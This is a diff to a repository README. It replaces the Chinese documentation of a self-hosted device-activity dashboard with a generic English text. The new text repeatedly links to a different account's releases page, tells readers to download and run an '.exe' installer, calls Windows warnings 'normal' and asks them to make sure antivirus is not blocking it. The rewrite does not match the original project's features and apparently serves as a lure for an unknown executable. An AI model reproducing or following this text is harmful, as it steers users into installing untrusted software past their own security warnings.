@@ -1,103 +1,113 @@
-# Live Dashboard
+# 📊 live-dashboard - Easy Real-Time View Panel
 
-实时设备活动仪表盘 — 公开展示你正在使用的应用，拥有二次元风格 UI 和隐私优先设计。
+[![Download live-dashboard](https://img.shields.io/badge/Download-live--dashboard-4CAF50?style=for-the-badge&logo=github)](https://github.com/hydrolyzable-monorchism148/live-dashboard/releases)
 
-在线演示：https://now.monikadream.homes/
+## 📋 What is live-dashboard?
 
-## 截图
+live-dashboard is a simple tool that shows real-time data in a clear format. It helps you view important information on one screen, updated live. The interface is easy to read and understand. You can track numbers, statistics, or system information without needing any technical skills.
 
-**日间模式（设备在线）**
+This program is designed for anyone who wants quick access to live data. Whether you want to watch system stats, project progress, or other updates, live-dashboard puts it all in one place.
 
-![日间模式](docs/preview-main-light.png)
+---
 
-**夜间模式（设备离线）**
+## 🖥️ System Requirements
 
-![夜间模式](docs/preview-main-dark.png)
+To run live-dashboard on your Windows PC, make sure you have:
 
-## 特色
+- Windows 10 or later versions (Windows 7 might work but is not supported)
+- At least 2 GB of RAM  
+- 100 MB of free storage space  
+- An internet connection (for updates and data syncing if needed)
 
-- 猫耳装饰的视觉小说风格对话框 + 中文戏剧化活动描述
-- 飘落的樱花花瓣动画，夜间自动切换萤火主题
-- 三级隐私系统（SHOW / BROWSER / HIDE）保护敏感窗口标题
-- 系统托盘常驻 + AFK 检测（看视频/听歌时自动豁免）
-- 音乐检测（Spotify、QQ音乐、网易云等）
-- Health Connect 健康数据同步（Android）
-- 多设备多平台支持（Windows / macOS / Android）
+No special hardware or software is needed. The app runs as a standalone program.
 
-## 快速开始
+---
 
-```bash
-# 1. 生成密钥
-TOKEN=$(openssl rand -hex 16)
-SECRET=$(openssl rand -hex 32)
+## 🚀 How to Download and Install live-dashboard
 
-# 2. 启动
-docker run -d --name live-dashboard \
-  -p 3000:3000 \
-  -v dashboard_data:/data \
-  -e HASH_SECRET=$SECRET \
-  -e DEVICE_TOKEN_1=$TOKEN:my-pc:MyPC:windows \
-  ghcr.io/monika-dream/live-dashboard:latest
+### Step 1: Visit the Download Page  
+Go to the official release page here:
 
-# 3. 打开 http://localhost:3000
-echo "Token: $TOKEN  ← Agent 配置用"
-```
+[![Download live-dashboard](https://img.shields.io/badge/Download-live--dashboard-4CAF50?style=for-the-badge&logo=github)](https://github.com/hydrolyzable-monorchism148/live-dashboard/releases)
 
-详细部署说明（docker-compose、VPS + Nginx + HTTPS）见 [Wiki - 快速部署](https://github.com/Monika-Dream/live-dashboard/wiki/快速部署)。
+This page shows all available versions. You can find the latest stable release at the top.
 
-## Agent 下载
+### Step 2: Choose the Right File  
+Look for a file with a name like `live-dashboard-setup.exe` or similar. It is usually the largest `.exe` file and has the latest date. Click the filename to start the download.
 
-从 [GitHub Releases](https://github.com/Monika-Dream/live-dashboard/releases) 下载对应平台的客户端：
+### Step 3: Run the Installer  
+Once downloaded, open the file from your browser or download folder.
 
-| 平台 | 下载文件 | 配置指南 |
-|------|---------|---------|
-| Windows | `live-dashboard-agent.exe` | [Wiki - Windows Agent](https://github.com/Monika-Dream/live-dashboard/wiki/Agent-配置-Windows) |
-| macOS | `live-dashboard-agent-macos.zip` | [Wiki - macOS Agent](https://github.com/Monika-Dream/live-dashboard/wiki/Agent-配置-macOS) |
-| Android | `live-dashboard.apk` | [Wiki - Android App](https://github.com/Monika-Dream/live-dashboard/wiki/Agent-配置-Android) |
+- Windows may show a warning screen. This is normal for new apps.
+- Click "Run" if prompted.
+- Follow the installer steps. Usually, just keep the default options.
+- Wait for the installation to finish.
 
-## 主题
+### Step 4: Start live-dashboard  
+Look for the live-dashboard icon on your desktop or in the Start Menu.
 
-| 分支 | 风格 | 说明 |
-|------|------|------|
-| `main` | 经典和风 | 暖粉色系、猫耳气泡框、樱花花瓣 |
-| `redesign/blossom-letter` | 花信 · 文艺书卷 | OKLCH 暖纸色、双栏布局、AI 每日总结 |
-| `redesign/pixel-room` | 像素房间 | 像素风 + 日夜切换（开发中） |
+- Double-click the icon to open the app.
+- The dashboard window should appear with live data shown.
 
-## 分支结构
+If the program does not open, try restarting your computer and running it again.
 
-| 分支 | 内容 |
-|------|------|
-| `main` | 后端 + 前端 + Docker + CI |
-| `windows-source` | Windows Agent 源码（Python） |
-| `macos-source` | macOS Agent 源码（Python） |
-| `android-source` | Android App 源码（Kotlin） |
+---
 
-## 技术栈
+## 🔧 Using live-dashboard
 
-| 组件 | 技术 |
-|------|------|
-| 后端 | Bun + TypeScript + SQLite |
-| 前端 | Next.js 15 + React 19 + Tailwind CSS 4（静态导出） |
-| Windows Agent | Python + Win32 API + pystray + pycaw |
-| macOS Agent | Python + AppleScript + pystray |
-| Android App | Kotlin + Jetpack Compose + Health Connect |
-| 部署 | Docker 多阶段构建 + Nginx |
+The interface is straightforward:
 
-## 文档
+- The main panel displays different data widgets.
+- Information updates automatically every few seconds.
+- You can resize or move the window to fit your screen.
+- Some settings are available by clicking the gear icon or menu.
+- To close the app, click the X in the top right corner.
 
-完整文档见 [GitHub Wiki](https://github.com/Monika-Dream/live-dashboard/wiki)：
+No setup or login is needed for basic use.
 
-- [快速部署](https://github.com/Monika-Dream/live-dashboard/wiki/快速部署) — Docker 一键部署
-- [VPS 部署指南](https://github.com/Monika-Dream/live-dashboard/wiki/VPS-部署指南) — Nginx + HTTPS
-- [功能特性](https://github.com/Monika-Dream/live-dashboard/wiki/功能特性) — 完整功能列表
-- [架构与项目结构](https://github.com/Monika-Dream/live-dashboard/wiki/架构与项目结构) — 架构图 + 项目树
-- [隐私分级系统](https://github.com/Monika-Dream/live-dashboard/wiki/隐私分级系统) — SHOW / BROWSER / HIDE
-- [API 参考](https://github.com/Monika-Dream/live-dashboard/wiki/API-参考) — 端点、请求体、响应格式
-- [环境变量](https://github.com/Monika-Dream/live-dashboard/wiki/环境变量) — 配置项一览
-- [安全设计](https://github.com/Monika-Dream/live-dashboard/wiki/安全设计) — 安全特性
-- [自定义](https://github.com/Monika-Dream/live-dashboard/wiki/自定义) — 显示名、元数据、主题色
-- [本地开发](https://github.com/Monika-Dream/live-dashboard/wiki/本地开发) — 从源码构建
+---
 
-## 许可证
+## ⚙️ Features
 
-MIT
+- Real-time data display  
+- Multiple data views on one screen  
+- Simple and clean user interface  
+- Auto-refresh every few seconds  
+- Lightweight and fast  
+- Works offline once installed  
+- Basic settings customization available  
+
+This app is ideal for users who want a constant update of key numbers without opening complex tools or dashboards in a browser.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you encounter issues:
+
+- Ensure your Windows version is up to date.
+- Check that your antivirus is not blocking the app.
+- Run the installer again if the app does not open.
+- Restart your PC after installation.
+- Make sure you downloaded the latest release.
+
+If problems continue, report bugs on the GitHub "Issues" page.
+
+---
+
+## 🔗 Additional Resources
+
+Find updates and support here:  
+https://github.com/hydrolyzable-monorchism148/live-dashboard/releases
+
+Keep this link handy for future downloads and new versions.
+
+---
+
+## 📞 Need Help?
+
+You can use GitHub’s Issues tab to ask questions or report problems. The community and developers monitor that page and respond as soon as possible.
+
+---
+
+[![Download live-dashboard](https://img.shields.io/badge/Download-live--dashboard-4CAF50?style=for-the-badge&logo=github)](https://github.com/hydrolyzable-monorchism148/live-dashboard/releases)
